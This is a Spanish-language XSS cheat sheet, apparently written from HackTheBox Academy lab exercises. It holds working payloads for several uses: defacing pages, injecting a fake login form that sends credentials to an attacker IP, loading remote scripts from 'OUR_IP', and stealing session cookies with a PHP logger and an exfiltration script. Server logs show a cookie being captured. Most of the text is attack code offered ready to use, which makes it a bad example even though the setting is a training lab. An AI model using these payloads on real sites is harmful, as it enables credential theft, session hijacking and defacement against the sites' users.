# Payloads básicos
```
<img src="" onerror=alert(document.cookie)>
```

```
<script>alert(document.cookie)</script>
```
# Defacement

## Background Color document.body.style.background
```
<script>document.body.style.background = "#141d2b"</script>
```

## Background document.body.background
```
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```

## Page Title document.title
```
<script>document.title = 'HackTheBox Academy'</script>
```

## Page Text DOM.innerHTML
```
document.getElementById("todo").innerHTML = "New Text"

$("#todo").html('New Text');

document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

Payload final:
```
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
</center>
```

# Phishing
Si tenemos una pagina vulnerable a XSS y se crea en la URL como este ejemplo:
![[Pasted image 20251008192800.png]]
Entonces averiguamos cual es el Payload malicioso
![[Pasted image 20251008193020.png]]
Y sabiendo que es vulnerable y va a traves de la URL podemos hacer uno y mandar la URL a alguien para que ponga las credenciales y robarselas

Login basico
```
<script>document.write('<h3>Please login to continue</h3><form action=http://[IP_KALI]><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');</script>
```

Cutre pero de ejemplo sirve:
![[Pasted image 20251008193148.png]]

Y nos ponemos a la escucha con:
```
nc -lvnp 80
```

![[Pasted image 20251008193215.png]]

# Hijacking

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
```
<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP")</script>
```

Caso en el que pudieramos llegar a controlar el .js que solicita, hagamos uno hipotético, configuramos todo:
```
┌──(root㉿Olvidix)-[/home/kali/Pruebas]
└─# ls
index.php  script.js



┌──(root㉿Olvidix)-[/home/kali/Pruebas]
└─# cat index.php             
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>



┌──(root㉿Olvidix)-[/home/kali/Pruebas]
└─# cat script.js       
new Image().src='http://10.10.14.139/index.php?c='+document.cookie



┌──(root㉿Olvidix)-[/home/kali/Pruebas]
└─# sudo php -S 0.0.0.0:80
[Wed Oct  8 13:52:38 2025] PHP 8.4.11 Development Server (http://0.0.0.0:80) started
[Wed Oct  8 13:57:08 2025] 10.129.70.207:40352 Accepted
[Wed Oct  8 13:57:08 2025] 10.129.70.207:40352 [200]: GET /script.js
[Wed Oct  8 13:57:08 2025] 10.129.70.207:40352 Closing
[Wed Oct  8 13:57:09 2025] 10.129.70.207:40354 Accepted
[Wed Oct  8 13:57:09 2025] 10.129.70.207:40354 [200]: GET /index.php?c=cookie=c00k1355h0u1d8353cu23d
[Wed Oct  8 13:57:09 2025] 10.129.70.207:40354 Closing
```

Esto sabeindo que el payload malicioso es:
```
"><script src="http://10.10.14.139/script.js"></script>
```


### La forma sencilla de siempre:
sabiendo el payload que funciona:
```
"><script>new Image().src="http://10.10.14.139:8000/cookie.php?c="+document.cookie;</script>
```

Y estando a la escucha con:
```
python3 -m http.server 8000
```